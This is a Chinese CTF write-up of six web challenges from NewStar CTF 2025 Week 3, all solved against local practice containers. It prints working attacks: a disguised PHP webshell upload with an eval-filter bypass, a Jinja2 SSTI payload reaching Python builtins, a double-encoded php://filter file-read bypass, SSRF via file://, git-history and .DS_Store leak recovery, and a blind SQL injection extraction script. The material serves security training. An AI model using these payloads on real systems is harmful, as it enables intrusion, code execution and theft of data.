---
title: NewStar CTF 2025 WP3 Web
published: 2026-04-15
description: Week3
image: "./3.jpg"
tags: ["CTF"]
category: CTF
draft: false
slug: NewStar_CTF_2025_WP_Web2
---

## Week3 Web

### mirror_gate

打开容器，发现考察文件上传漏洞：

打开源码，发现如下提示：

```plain
<!-- flag is in flag.php -->
<!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== -->
```

解码后：

```plain
<!-- flag is in flag.php -->
<!-- HINT: something_is_in_/uploads/ -->
```

那就去扫下 /uploads/ 下有什么东西：

使用 Dirsearch：

```shellscript
python dirsearch.py -u http://192.168.42.1:26851/uploads/ -e * -x 404,403
```

这里扫到：`/uploads/.htaccess`

访问得到：

```plain
AddType application/x-httpd-php .webp
```

这道题会把 .webp 后缀的文件当作 php 文件执行

由此我们后缀的问题解决，来看文件内容：

一番试探后发现会检验文件头，这里我们假装 .gif 后缀发送请求包：

```http
POST /upload.php HTTP/1.1

Host: 192.168.42.1:26851

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary02q70XBquIVtAIt8

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept-Language: zh-CN,zh;q=0.9

Origin: http://192.168.42.1:26851

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.42.1:26851/

Accept-Encoding: gzip, deflate

Content-Length: 328

  

------WebKitFormBoundary02q70XBquIVtAIt8

Content-Disposition: form-data; name="files[]"; filename="1.webp"

Content-Type: image/gif

  

GIF89a

<?php @eval($_POST['cmd']); ?>

------WebKitFormBoundary02q70XBquIVtAIt8

Content-Disposition: form-data; name="MAX_FILE_SIZE"

  

5242880

------WebKitFormBoundary02q70XBquIVtAIt8--
```

发现被过滤，这里尝试后发现好像 eval() 被过滤了，这里使用拼接绕过

最终 payload：

```http
POST /upload.php HTTP/1.1

Host: 192.168.42.1:26851

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary02q70XBquIVtAIt8

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept-Language: zh-CN,zh;q=0.9

Origin: http://192.168.42.1:26851

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.42.1:26851/

Accept-Encoding: gzip, deflate

Content-Length: 328

  

------WebKitFormBoundary02q70XBquIVtAIt8

Content-Disposition: form-data; name="files[]"; filename="1.webp"

Content-Type: image/gif

  

GIF89a

<?@("ev"."al")($_POST['cmd']);?>

------WebKitFormBoundary02q70XBquIVtAIt8

Content-Disposition: form-data; name="MAX_FILE_SIZE"

  

5242880

------WebKitFormBoundary02q70XBquIVtAIt8--
```

得到上传成功的响应，这里使用中国蚁剑直接连接，拿到 flag：

flag{0fc68107-f403-0147-94de-4c34b9a09dfc}

（也可以使用 hackbar 连接，用密码+指令）

### who'ssti

这里我们先下载得到一个附件 who'ssti

其中的有效内容 app.py 内容如下：

```python
from flask import Flask, jsonify, request, render_template_string, render_template

import sys, random

  

func_List = ["get_close_matches", "dedent", "fmean",

             "listdir", "search", "randint", "load", "sum",

             "findall", "mean", "choice"]

need_List = random.sample(func_List, 5)

need_List = dict.fromkeys(need_List, 0)

BoleanFlag = False

RealFlag = __import__("os").environ.get("ICQ_FLAG", "flag{test_flag}")

# 清除 ICQ_FLAG

__import__("os").environ["ICQ_FLAG"] = ""

  

def trace_calls(frame, event, arg):

  if event == 'call':

    func_name = frame.f_code.co_name

    # print(func_name)

    if func_name in need_List:

      need_List[func_name] = 1

    if all(need_List.values()):

      global BoleanFlag

      BoleanFlag = True

  return trace_calls

  
  

app = Flask(__name__)

@app.route('/', methods=["GET", "POST"])

def index():

  submit = request.form.get('submit')

  if submit:

    sys.settrace(trace_calls)

    print(render_template_string(submit))

    sys.settrace(None)

    if BoleanFlag:

      return jsonify({"flag": RealFlag})

    return jsonify({"status": "OK"})

  return render_template_string('''<!DOCTYPE html>

<html lang="zh-cn">

<head>

    <meta charset="UTF-8">

    <title>首页</title>

</head>

<body>

    <h1>提交你的代码，让后端看看你的厉害！</h1>

    <form action="/" method="post">

        <label for="submit">提交一下：</label>

        <input type="text" id="submit" name="submit" required>

        <button type="submit">提交</button>

    </form>

    <div style="margin-top: 20px;">

        <p> 尝试调用到这些函数！ </p>

    {% for func in funcList %}

        <p>{{ func }}</p>

    {% endfor %}

    <div style="margin-top: 20px; color: red;">

        <p> 你目前已经调用了 {{ called_funcs|length }} 个函数：</p>

        <ul>

        {% for func in called_funcs %}

            <li>{{ func }}</li>

        {% endfor %}

        </ul>

    </div>

</body>

<script>

</script>

</html>

  

                                '''

                                ,

                                funcList = need_List, called_funcs = [func for func, called in need_List.items() if called])

  

if __name__ == '__main__':

  app.run(host='0.0.0.0', port=5000, debug=False)
```

构造以下 payload：

```plain
{% set x = self.__init__.__globals__['__builtins__']['__import__'] %}{% set _ = x('difflib').get_close_matches('a', ['a']) %}{% set _ = x('textwrap').dedent('a') %}{% set _ = x('statistics').fmean([1]) %}{% set _ = x('os').listdir('.') %}{% set _ = x('re').search('a', 'a') %}{% set _ = x('random').randint(1,1) %}{% set _ = x('json').load(x('io').StringIO('{}')) %}{% set _ = [1,2]|sum %}{% set _ = x('re').findall('a', 'a') %}{% set _ = x('statistics').mean([1]) %}{% set _ = x('random').choice([1]) %}
```

得到 flag：

flag{66ffaa22-e8ad-0113-0ab1-6e5b2510cf33}

### ez-chain

打开容器直接贴出了源码：

```php
<?php  
header('Content-Type: text/html; charset=utf-8');  
function filter($file) {    $waf = array('/',':','php','base64','data','zip','rar','filter','flag');  
    foreach ($waf as $waf_word) {  
        if (stripos($file, $waf_word) !== false) {  
            echo "waf:".$waf_word;  
            return false;  
        }  
    }  
    return true;  
}  
  
function filter_output($data) {    $waf = array('f');  
    foreach ($waf as $waf_word) {  
        if (stripos($data, $waf_word) !== false) {  
            echo "waf:".$waf_word;  
            return false;  
        }  
    }  
    while (true) {        $decoded = base64_decode($data, true);  
        if ($decoded === false || $decoded === $data) {  
            break;  
        }        $data = $decoded;  
    }  
    foreach ($waf as $waf_word) {  
        if (stripos($data, $waf_word) !== false) {  
            echo "waf:".$waf_word;  
            return false;  
        }  
    }  
    return true;  
}  
  
if (isset($_GET['file'])) {    $file = $_GET['file'];  
    if (filter($file) !== true) {  
        die();  
    }    $file = urldecode($file);    $data = file_get_contents($file);  
    if (filter_output($data) !== true) {  
        die();  
    }  
    echo $data;  
}  
highlight_file(__FILE__);  
  
?>
```

这里解释下逻辑：

首先就是一个防火墙机制，会查找你传入的参数是否与其先预载入的字符串一致


stripos — 查找字符串首次出现的位置（不区分大小写）

base64_decode — 对使用 MIME base64 编码的数据进行解码
- **base64_decode** ( string `$data` [, bool `$strict` = false ] ) : string
- 当设置 `strict` 为 **`TRUE`** 时，一旦输入的数据超出了 base64 字母表，将返回 **`FALSE`**。 否则会静默丢弃无效的字符

file_get_contents — 将整个文件读入一个字符串

最终 payload：

```plain
/?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2572%2565%2561%2564%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%252f%2566%256c%2561%2567
```

得到 flag：synt{599o7o18-nq72-0p19-o174-n79qq81s11o9}

在对其进行一次 rot13 得到 flag：

flag{599b7b18-ad72-0c19-b174-a79dd81f11b9}
### MyGO!!!

z学长又出题了

打开容器，扫视一遍源码没发现线索

使用 dirsearch 扫一遍，得到：

```plain
[14:45:22] 200 -  647B  - /flag.php
```

访问 `/flag.php`，得到：

```php
<?php
$client_ip = $_SERVER['REMOTE_ADDR'];

// 只允许本地访问
if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {
    header('HTTP/1.1 403 Forbidden');
    echo "你是外地人，我只要\"本地\"人";
    exit;
}

highlight_file(__FILE__);

if (isset($_GET['soyorin'])) {
    $url = $_GET['soyorin'];

    echo "flag在根目录";
    
    // 普通请求
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); // 直接输出给浏览器
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);
    curl_exec($ch);
    curl_close($ch);
    exit;
}
?>
```

`$_SERVER` — 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组

REMOTE_ADDR — `$_SERVER` 内的一个特定索引，代表正在浏览当前页面的用户 IP 地址

127.0.0.1：是 **IPv4** 协议下的本地地址
    
::1：是 **IPv6** 协议下的本地地址

这里是因为赛后复现在本地启动，直接跳过伪造 127.0.0.1 就得到源码了（

最终 payload：

```plain
http://127.0.0.1:2685/flag.php?soyorin=file:///flag
```

得到 flag：

flag{31db76ff-48d5-4d2c-1ce2-ad9384542326}

### 小 E 的秘密计划

打开容器，题目给的提示很明显 **先找到网站备份文件**，这里扫到：

```plain
[15:04:08] 200 -   39KB - /www.zip
```

访问后拿下备份文件，使用文件名（public-555edc76-9621-4997-86b9-01483a50293e）到达下一关入口：

需要登录，这里我们根据题目提示去看 git 历史记录：

```plain
PS D:\CTF_Exercises\public-555edc76-9621-4997-86b9-01483a50293e> git log
commit 5fef682d7eceba025c894af4a5f8bf4680666368 (HEAD -> master)
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:14:25 2025 +0800

    删除提示

commit 5f8ecc03aee0de892013bba7ce0522876c419b58
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:14:08 2025 +0800

    新增提示

commit 1389b4798a8013a1c90fb2d867243d0da18c5175
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:10:02 2025 +0800

    初始化
```

这里访问新增提示：

```plain
PS D:\CTF_Exercises\public-555edc76-9621-4997-86b9-01483a50293e> git show 5f8ecc03aee0de892013bba7ce0522876c419b58
commit 5f8ecc03aee0de892013bba7ce0522876c419b58
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:14:08 2025 +0800

    新增提示

diff --git a/tips.txt b/tips.txt
new file mode 100644
index 0000000..a7fa1d9
--- /dev/null
+++ b/tips.txt
@@ -0,0 +1 @@
+tips：什么是branch
\ No newline at end of file
```

提示 branch：

```plain
PS D:\CTF_Exercises\public-555edc76-9621-4997-86b9-01483a50293e> git branch
* master
```

可以看到没有分支，这里我们看看历史 git 操作：

```plain
PS D:\CTF_Exercises\public-555edc76-9621-4997-86b9-01483a50293e> git reflog
5fef682 (HEAD -> master) HEAD@{0}: commit: 删除提示
5f8ecc0 HEAD@{1}: commit: 新增提示
1389b47 HEAD@{2}: checkout: moving from test to master
353b98f HEAD@{3}: commit: 测试，这个branch会删
1389b47 HEAD@{4}: checkout: moving from master to test
1389b47 HEAD@{5}: commit (initial): 初始化
```

查看测试 branch，得到账号密码：

```plain
PS D:\CTF_Exercises\public-555edc76-9621-4997-86b9-01483a50293e> git show 353b98f
commit 353b98f7c2fe77a5a426bf73576f5113820c4669
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:11:48 2025 +0800

    测试，这个branch会删

diff --git a/user.php b/user.php
new file mode 100644
index 0000000..f3d34d7
--- /dev/null
+++ b/user.php
@@ -0,0 +1,8 @@
+<?php
+
+function getUserData() {
+    return [
+        'username' => 'admin',
+        'password' => 'f75cc3eb-21e0-4713-9c30-998a8edb13de'
+    ];
+}
\ No newline at end of file
```

到达最后一关，提示说网站是拿 Mac 写的代码

这里我们知道 Mac 的文件管理器会在你创建、编辑文件夹的时候自动生成一个 `.DS_Store` 文件，该文件记录了目录结构、文件列表、图标位置、排序方式、自定义视图等元数据

这里直接访问拿到 `.DS_Store` 文件，尝试使用 Vscode 打开，发现是个二进制文件

这里使用专门的工具 **ds_store_exp** 去打开，得到：

```plain
PS D:\CTF_Tools\ds_store_exp-master\ds_store_exp-master> python ds_store_exp.py http://127.0.0.1:34477/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store
[200] http://127.0.0.1:34477/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store
[200] http://127.0.0.1:34477/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/ffffllllaaaagggg114514
```

得到文件的路径，访问后得到 flag：

flag{e9ddf4d1-2ac7-f3a0-7919-1c76ce1c8573}、

（dirsearch 默认字典（dicc.txt）里通常不包含 .DS_Store）
### 白帽小 K 的故事（2）

很明显的一道 SQL 注入题目

题目给的提示说 **SELECT 1 from Terra.animal WHERE name = '$name'**

这里是 MySQL 的一种写法： database.table **完全限定名**

database — 数据库名

table — 数据库中的表名

这里我们知道了数据库名为 Terra，表名为 animal

题目还提示使用盲注：

```python
from http.client import responses
import requests
import time

# ================ 配置区域 ==================
URL = "http://192.168.42.1:46858/search"  # 目标URL
PARAM = "name"                    # 注入的参数名（POST 表单字段）
TRUE_KEYWORD = "ok"               # 条件为真时页面返回的内容特征
DATABASE = "Terra"                # 目标数据库名
# ===========================================

# 请求头（模拟浏览器，避免被识别为机器人）
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

# 创建会话
session = requests.Session()


def is_true(payload):
    """发送 POST 请求，判断注入条件是否为真"""
    data = {PARAM: payload}
    try:
        response = session.post(URL, data=data, headers=headers, timeout=10)
        return TRUE_KEYWORD in response.text
    except Exception as e:
        print(f"[!] 请求错误: {e}")
        return False


def extract_char(position, target_str):
    """使用二分法猜解指定位置的字符 ASCII 值"""
    low = 32   # 可打印字符起始
    high = 126 # 可打印字符结束
    while low <= high:
        mid = (low + high) // 2

        # 构造 SQL 注入 payload
        injection = (
            f"amiy'+IF((((ord(mid((Select(group_concat(flag))from(Flag.flag)),{position},1))))>({mid})),'a','1')#"
        )
        # amiy'+IF((((ord(mid((Select(group_concat(schema_name))from(infOrmation_schema.schemata)),{position},1))))>({mid})),'a','1')#

        if is_true(injection):
            low = mid + 1
        else:
            high = mid - 1

    return chr(low) if low <= 126 else '?'


def extract_table_names():
    """主函数：提取指定数据库中的所有表名"""
    # injection那一行可以修改查询哪个数据库
    # 其实SQL注入入门特别简单，但是你会遇到各种各样的waf，这个时候就考验你对各种数据库语法的知识和理解了

    print(f"[*] 开始盲注，目标数据库: {DATABASE}")
    result = ""
    position = 1

    while True:
        char = extract_char(position, DATABASE)

        # 判断是否为有效字符
        if ord(char) < 32 or ord(char) > 126:
            print(f"\n[+] 猜解结束。")
            break

        result += char
        print(f"\r[+] 当前结果: {result}", end="", flush=True)

        # 防止请求过快
        time.sleep(0.1)
        position += 1

        # 安全限制
        if position > 100:
            print("\n[!] 长度超限，停止。")
            break

    print(f"\n[+] 成功提取表名: {result}")
    return result


# ================ 执行 ==================
if __name__ == "__main__":
    try:
        extract_table_names()
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断。")
    except Exception as e:
        print(f"\n[!] 发生异常: {e}")
```

拿到 flag：

flag{99028fce-4051-c472-9821-83260832ed9c}